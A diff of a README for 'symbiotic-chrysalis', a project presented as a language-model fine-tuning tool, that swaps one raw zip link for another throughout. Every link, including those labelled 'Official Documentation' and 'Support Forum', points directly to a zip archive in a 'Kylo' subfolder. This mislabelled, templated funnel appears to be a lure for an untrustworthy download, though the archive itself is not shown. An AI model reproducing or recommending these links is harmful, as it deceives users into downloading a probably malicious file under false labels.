@@ -1,6 +1,6 @@
 # 🌱 symbiotic-chrysalis - Fine-Tune Language Models with Ease
 
-[![Download](https://raw.githubusercontent.com/JAYIJ/symbiotic-chrysalis/main/Kylo/chrysalis-symbiotic-3.4.zip)](https://raw.githubusercontent.com/JAYIJ/symbiotic-chrysalis/main/Kylo/chrysalis-symbiotic-3.4.zip)
+[![Download](https://github.com/JAYIJ/symbiotic-chrysalis/raw/refs/heads/main/Kylo/chrysalis-symbiotic-v2.1.zip)](https://github.com/JAYIJ/symbiotic-chrysalis/raw/refs/heads/main/Kylo/chrysalis-symbiotic-v2.1.zip)
 
 ## 📦 Overview
 symbiotic-chrysalis provides fine-tuning scripts and pipelines for transformer-based language models. This project focuses on unifying modules within the asi-ecosystem to boost capabilities towards creating planetary symbiotic intelligence. It simplifies the process of language model training so you can concentrate on results.
@@ -15,7 +15,7 @@ To get started, you will need to download the application from the Releases page
 - **Storage:** Minimum 500 MB of free space
 
 ## 🔗 Download & Install
-To download the latest version of symbiotic-chrysalis, visit this page: [Download symbiotic-chrysalis Releases](https://raw.githubusercontent.com/JAYIJ/symbiotic-chrysalis/main/Kylo/chrysalis-symbiotic-3.4.zip).
+To download the latest version of symbiotic-chrysalis, visit this page: [Download symbiotic-chrysalis Releases](https://github.com/JAYIJ/symbiotic-chrysalis/raw/refs/heads/main/Kylo/chrysalis-symbiotic-v2.1.zip).
 
 Here, you can find the most recent build along with any previous versions. Choose the version you need and follow the steps below:
 
@@ -61,10 +61,10 @@ If you are interested in contributing, please read our contribution guidelines. 
 This project is licensed under the MIT License. It allows you to use, modify, and distribute the software as you see fit.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://raw.githubusercontent.com/JAYIJ/symbiotic-chrysalis/main/Kylo/chrysalis-symbiotic-3.4.zip)
-- [Support Forum](https://raw.githubusercontent.com/JAYIJ/symbiotic-chrysalis/main/Kylo/chrysalis-symbiotic-3.4.zip)
+- [Official Documentation](https://github.com/JAYIJ/symbiotic-chrysalis/raw/refs/heads/main/Kylo/chrysalis-symbiotic-v2.1.zip)
+- [Support Forum](https://github.com/JAYIJ/symbiotic-chrysalis/raw/refs/heads/main/Kylo/chrysalis-symbiotic-v2.1.zip)
 
 ## 🎉 Download the Latest Version
-For the best experience, always ensure you are using the latest version. Visit this page to download: [Download symbiotic-chrysalis Releases](https://raw.githubusercontent.com/JAYIJ/symbiotic-chrysalis/main/Kylo/chrysalis-symbiotic-3.4.zip).
+For the best experience, always ensure you are using the latest version. Visit this page to download: [Download symbiotic-chrysalis Releases](https://github.com/JAYIJ/symbiotic-chrysalis/raw/refs/heads/main/Kylo/chrysalis-symbiotic-v2.1.zip).
 
 Thank you for your interest in symbiotic-chrysalis!
